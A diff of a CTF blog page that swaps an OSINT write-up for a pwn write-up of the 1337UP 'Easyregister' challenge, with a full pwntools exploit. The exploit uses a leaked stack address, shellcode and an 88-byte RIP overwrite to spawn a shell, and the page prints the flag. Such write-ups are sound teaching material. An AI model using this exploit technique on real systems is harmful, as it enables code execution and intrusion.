@@ -3,41 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769773824900">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.786029315102">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Blink’s Secret</title>
-    <meta name="title" content="Blink’s Secret">
-    <meta name="description" content="Hello Everyone. This is my another blog of solving another challenge of 1337up CTF hosted by Intigriti">
+    <title>Easyregister</title>
+    <meta name="title" content="Easyregister">
+    <meta name="description" content="First let's download and analyze the binary">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/vyshak/">
+    <link rel="canonical" href="https://blogs.tamilctf.com/ctftime-writeups/1337up-intigrity/jopraveen/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/vyshak/">
-    <meta property="og:title" content="Blink’s Secret">
-    <meta property="og:description" content="Hello Everyone. This is my another blog of solving another challenge of 1337up CTF hosted by Intigriti">
-    <meta property="og:image" content="https://miro.medium.com/max/1190/1*LmwBpZslP3TtMXGWp3Twwg.jpeg">
+    <meta property="og:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up-intigrity/jopraveen/">
+    <meta property="og:title" content="Easyregister">
+    <meta property="og:description" content="First let's download and analyze the binary">
+    <meta property="og:image" content="https://i.imgur.com/urPqzh3.png">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up---intigrity/vyshak/">
-    <meta property="twitter:title" content="Blink’s Secret">
-    <meta property="twitter:description" content="Hello Everyone. This is my another blog of solving another challenge of 1337up CTF hosted by Intigriti">
-    <meta property="twitter:image" content="https://miro.medium.com/max/1190/1*LmwBpZslP3TtMXGWp3Twwg.jpeg">
+    <meta property="twitter:url" content="https://blogs.tamilctf.com/ctftime-writeups/1337up-intigrity/jopraveen/">
+    <meta property="twitter:title" content="Easyregister">
+    <meta property="twitter:description" content="First let's download and analyze the binary">
+    <meta property="twitter:image" content="https://i.imgur.com/urPqzh3.png">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
     <link href="../../../assets/img/logo.png" rel="icon">
-    <link href="../../../resources/css/retype.css?v=3.5.0.769773824900" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.6.0.786029315102" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.769773824900" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.769773824900" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.6.0.786029315102" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.6.0.786029315102" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.6.0.786029315102" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -204,10 +205,10 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="blinks-secret" class="break-words">
+<doc-anchor-target id="easyregister" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#blinks-secret">#</doc-anchor-trigger>
-        <span>Blink’s Secret</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#easyregister">#</doc-anchor-trigger>
+        <span>Easyregister</span>
     </h1>
 </doc-anchor-target>
 <div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
@@ -217,7 +218,7 @@
           <div class="shrink-0 w-8 h-8 overflow-hidden rounded-full">
             <svg width="2rem" height="2rem" xmlns="http://www.w3.org/2000/svg" fill="white"><g><rect width="2rem" height="1.7rem" fill="#c5c5c5"/><circle r="0.44rem" cy="0.83rem" cx="1rem"/><ellipse ry="0.96rem" rx="0.77rem" cy="2.15rem" cx="1rem"/></g></svg>
           </div>
-          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">Vyshak</div>
+          <div class="ml-1 whitespace-nowrap text-gray-500 dark:text-dark-350">jopraveen</div>
         </div>
     </div>
     <div class="mx-2">&#9679;</div>
@@ -227,100 +228,146 @@
     <div class="flex items-center shrink-0">Published&nbsp;<span>2022-03-13</span></div>
 </div>
 
-<p>Hello Everyone. This is my another blog of solving another challenge of <a href="https://ctf.intigriti.io/"><strong>1337up CTF</strong></a> hosted by <a href="https://www.intigriti.com/"><strong>Intigriti</strong></a><strong>.</strong> My team <a href="https://tamilctf.com/"><strong>TamilCTF</strong></a> has scored 10th in this CTF.</p>
-<p>In this writeup we are gonna see an OSINT challenge <strong>Blink’s Secret.</strong> I am so happy to say that I got first blood for this challenge <span class="docs-emoji">&#x1F60A;</span>. Also thanks for <a href="https://twitter.com/cyberpj1">Paul</a> for collaborating with me in this challenge.</p>
+<doc-anchor-target id="easy-register">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#easy-register">#</doc-anchor-trigger>
+        <span>Easy Register</span>
+    </h2>
+</doc-anchor-target>
 <p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1190/1*LmwBpZslP3TtMXGWp3Twwg.jpeg" alt="">
+    <img src="https://i.imgur.com/urPqzh3.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>Blink’s Secret Challenge</p>
-<p>So, In this challenge, they have given a <a href="https://downloads.ctf.intigriti.io/1337UPLIVECTF2022-894ff411-aff8-453c-87b1-20ea939a7b6c/blinkssecret/7ebf4b6c-e4b3-490d-8a06-5c076906f530/note.txt"><strong>note.txt</strong></a> file and an <a href="https://downloads.ctf.intigriti.io/1337UPLIVECTF2022-894ff411-aff8-453c-87b1-20ea939a7b6c/blinkssecret/7ebf4b6c-e4b3-490d-8a06-5c076906f530/meme.jpg"><strong>image</strong></a>. Let’s see what’s in the note.txt file.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1268/1*J3u1_3D-_UVoM-HLlYQwjg.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>note.txt</p>
-<p>So the note says we need to find someone’s social media account. They have given certain hints to find the account.</p>
 <ul>
-<li><em>The username comprises of name and the zip-code of current residence</em></li>
-<li><em>The username is 15 characters long.</em></li>
-<li><em>We need to find the name of the blinking man in the image.</em></li>
-<li><em>The format is</em> <strong><em>Name_zipcode</em></strong><em>.</em></li>
-<li><em>If the name is thomas mueller then write the name as ThomasMueller.</em></li>
+<li>First let&#x27;s download and analyze the binary</li>
 </ul>
-<p>Let’s see what is in that image.</p>
+<doc-anchor-target id="info">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#info">#</doc-anchor-trigger>
+        <span>Info</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li>ELF 64-bit executable</li>
+<li>Dynamically linked</li>
+<li>Not stripped</li>
+</ul>
+<p><strong>checksec:</strong></p>
 <p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1352/1*zAWBiumlqYNtcGa-L37KoQ.jpeg" alt="">
+    <img src="https://i.imgur.com/FLpgy9B.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>image of blinking man</p>
-<p>It is the iconic blinking man meme. We need to find his real name.</p>
+<ul>
+<li>The Stack is executable because NX is disabled</li>
+<li>First let&#x27;s run the binary and see what it gives</li>
+</ul>
+<doc-anchor-target id="analyzing">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#analyzing">#</doc-anchor-trigger>
+        <span>Analyzing</span>
+    </h4>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-javascript"><code v-pre class="language-javascript">➜  pwn  ./easy_register 
+  _ _______________ _   _ ____  
+ / |___ /___ /___  | | | |  _ \ 
+ | | |_ \ |_ \  / /| | | | |_) |
+ | |___) |__) |/ / | |_| |  __/ 
+ |_|____/____//_/   \___/|_|    
+                                
+[i] Initialized attendee listing at 0x7ffd0421cac0.
+[i] Starting registration application.
+
+Hacker name &gt; jopraveen
+
+[+] Registration completed. Enjoy!
+[+] Exiting.</code></pre>
+</doc-codeblock></div>
+<ul>
+<li>We have a leak <code v-pre>0x7ffd0421cac0</code></li>
+<li>Most likely, this will be the starting address of our buffer</li>
+<li>Then we&#x27;re prompted to give our name</li>
+<li>May be there&#x27;s a buffer overflow?</li>
+<li>Let&#x27;s decompile this binary and see what it does :D</li>
+</ul>
 <p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1276/1*btQEz7-DYjisBPioz7uDQg.jpeg" alt="">
+    <img src="https://i.imgur.com/AR1b2AI.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>So his name is Drew Scanlon. So the password will be <strong>DrewScanlon_</strong>*.** We need to find his pin-code of current residence. Let’s see his <a href="https://twitter.com/drewscanlon">twitter account</a>.</p>
+<ul>
+<li>Cool, they&#x27;re using gets and it&#x27;s vulnerable to buffer overflow</li>
+<li>Find the offset to Instruction pointer (I didn&#x27;t mention it in the post because it&#x27;s very easy)</li>
+<li>Now let&#x27;s write our exploit</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+elf = context.binary = ELF('easy_register')
+p = elf.process()
+p = remote('easyregister.ctf.intigriti.io',7777)
+
+p.recvuntil('listing at ')
+stack_buffer = int(p.recvline().replace(b'.',b''),16)
+log.success(f'stack leak: {hex(stack_buffer)}')</code></pre>
+</doc-codeblock></div>
+<ul>
+<li>First let&#x27;s store the leak in a variable</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">payload = asm(shellcraft.sh()) # shellcode
+payload += b'A'*(88 - len(payload)) # junk
+payload += p64(stack_buffer) # buffer base address</code></pre>
+</doc-codeblock></div>
+<ul>
+<li>Let&#x27;s put our shellcode at the beginning and fill some junk until RIP</li>
+</ul>
+<p><em>Note: Offset to RIP is <strong>88</strong></em></p>
+<ul>
+<li>Finally let&#x27;s overwrite the Instruction pointer with the leaked value (our input buffer&#x27;s starting address)</li>
+</ul>
+<doc-anchor-target id="full-exploit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#full-exploit">#</doc-anchor-trigger>
+        <span>Full exploit</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock line-numbers>
+<pre class="language-python"><code v-pre class="language-python">from pwn import *
+
+elf = context.binary = ELF('easy_register')
+p = elf.process()
+p = remote('easyregister.ctf.intigriti.io',7777)
+
+p.recvuntil('listing at ')
+stack_buffer = int(p.recvline().replace(b'.',b''),16)
+log.success(f'stack leak: {hex(stack_buffer)}')
+
+payload = asm(shellcraft.sh())
+payload += b'A'*(88 - len(payload))
+payload += p64(stack_buffer)
+
+p.sendline(payload)
+p.interactive()</code></pre>
+</doc-codeblock></div>
 <p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1192/1*dJYpGgbJ4dgncA3cTkg_Rg.jpeg" alt="">
+    <img src="https://i.imgur.com/XzfYQ6L.png" alt="">
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
-<p>While taking a peek at his twitter account, we came to a conclusion that he lives in San Francisco, California. Let’s find the pin-code of <a href="https://www.zip-codes.com/city/ca-san-francisco.asp">San Francisco</a>.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1288/1*5bEDL_HIC4W1wk_r8JVgtA.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>So the pincode is 941***. We need only the first three numbers since the username is 15 characters long. So the username will be <strong>DrewScanlon_941.</strong></p>
-<p>After searching this username in almost all Social Media platforms, I found this account on <a href="https://twitter.com/DrewScanlon_941">twitter</a>.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1342/1*_ImRSB2EjQjvAl0RYL4T4g.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>DrewScanlon_941</p>
-<p>Well, the bio says it all. This account has only one tweet. Let’s take a look at that.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1324/1*lbT5IVy3qxC1IV78WnI0pg.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>tweet</p>
-<p>That’s a nice hint. In order to see those previous tweets, lets hop into the <a href="https://web.archive.org/">Wayback Machine</a>.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1400/1*RH_WSyFnm2Xcadxva1QNNQ.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>wayback machine</p>
-<p>Enter the url of that account and it will show the previous snapshots. We can see the old tweets (actually one tweet in this account <span class="docs-emoji">&#x1F601;</span>).</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1400/1*oZegZld4Ic529TesvKpPzw.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>old tweet</p>
-<p>That font looks a bit sus isn’t it? I will show you why. Go to <a href="https://holloway.nz/steg/">https://holloway.nz/steg/</a> . It is a website to hide secret messages in a tweet. Let’s decrypt what’s in it.</p>
-<p><figure class="content-center">
-    <img src="https://miro.medium.com/max/1400/1*VySpk0hQiThA96w777rkKw.jpeg" alt="">
-    <figcaption class="caption"></figcaption>
-</figure>
-</p>
-<p>flag</p>
-<p>Well we got the flag <a href="https://emojipedia.org/triangular-flag/"><span class="docs-emoji">&#x1F6A9;</span></a>.</p>
-<p>Well that’s the end of this challenge. Hope you like the blog. If you do, make sure to clap and share to your hacker buddies and tech enthusiasts. Follow me on socials for more awesome content, links given below. Let’s see you in next blog until then <strong>PEACE OUT</strong> <span class="docs-emoji">&#x270C;&#xFE0F;</span>.</p>
+<ul>
+<li>We got our flag <code v-pre>1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}</code></li>
+</ul>
 
                                 <div class="flex items-center mt-6 mb-6 clear-both">
                                     <span>
                                         <a href="../../../tags/">
                                             <svg class="inline-block -mb-px mr-1.5 text-blue-500 dark:text-blue-400" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" overflow="visible" fill="currentColor"><g><path d="M21.3 9.88l-8.59-8.59C12.52 1.11 12.27 1 12 1H2c-.55 0-1 .45-1 1v10c0 .27.11.52.29.71l8.59 8.58c.57.57 1.32.88 2.12.88s1.55-.31 2.12-.88l7.17-7.17a3.009 3.009 0 00.01-4.24zm-1.42 2.82l-7.17 7.17c-.39.39-1.02.39-1.42 0L3 11.59V3h8.59l8.29 8.29c.39.39.39 1.03 0 1.41z" /><path d="M7.01 6C6.45 6 6 6.45 6 7s.45 1 1 1 1-.45 1-1-.44-1-.99-1z" /></g></svg>
                                         </a>
-                                        <span class="mr-2"><a href="../../../tags/osint/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
-                                    <span>osint</span>
+                                        <span class="mr-2"><a href="../../../tags/pwn/" class="no-link inline-flex align-middle items-center justify-center font-medium leading-none whitespace-nowrap text-blue-500 dark:text-blue-400 border border-blue-500 dark:border-blue-400 hover:bg-blue-100 dark:hover:bg-transparent dark:hover:border-blue-200 dark:hover:text-blue-200 transition-colors duration-200 ease-out h-6 px-2 text-xs rounded-md">
+                                    <span>pwn</span>
                                 </a></span>
                                     </span>
                                 </div>
@@ -332,13 +379,20 @@
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up-intigrity/vyshak/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Blink’s Secret</span>
+                                            </span>
+                                        </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up---intigrity/jopraveen/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../ctftime-writeups/1337up-intigrity/admin/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Easyregister</span>
+                                                <span class="block mt-1">Getting admin access</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -382,6 +436,6 @@
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Blink’s Secret", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Easyregister", level: 3, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
